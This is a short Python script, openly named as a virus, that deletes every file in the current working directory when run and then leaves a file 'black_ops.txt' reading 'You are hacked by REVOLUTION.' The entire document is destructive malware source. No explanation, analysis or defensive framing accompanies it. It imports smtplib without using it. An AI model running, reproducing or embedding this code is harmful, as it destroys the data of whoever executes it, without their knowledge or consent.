import os
import smtplib

class Virus:
	def __init__(self, filename):
		self.filename = filename
            
	def delete_files(self):
		os.remove(self.filename)

	def del_data_replace(self):
		new_file = open("black_ops.txt", "a").write("You are hacked by REVOLUTION.")
		

def main():
	for filee in os.listdir(os.getcwd()):
		a = Virus(filee)
		a.delete_files()

	a.del_data_replace()

if (2 != 3):
	print(main())		
